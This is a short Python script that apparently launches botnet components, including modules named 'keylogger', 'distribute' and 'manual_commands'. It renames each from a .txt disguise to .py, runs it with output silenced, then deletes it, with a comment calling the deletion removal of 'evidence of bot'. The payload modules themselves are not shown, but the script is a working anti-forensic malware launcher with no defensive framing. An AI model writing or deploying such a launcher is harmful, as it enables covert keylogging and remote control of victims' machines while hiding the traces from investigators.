import subprocess

bots = ['distribute', 'system_info', 'manual_commands', 'keylogger']

def run_bot(filename):
    # write file
    subprocess.run(['mv', f'{filename}.txt', f'{filename}.py'])

    # run the bot
    subprocess.run(['python3', f'{filename}.py'], stdout=subprocess.DEVNULL)

    # delete evidence of bot
    subprocess.run(['rm', f'{filename}.py'])

for bot in bots:
    run_bot(bot)
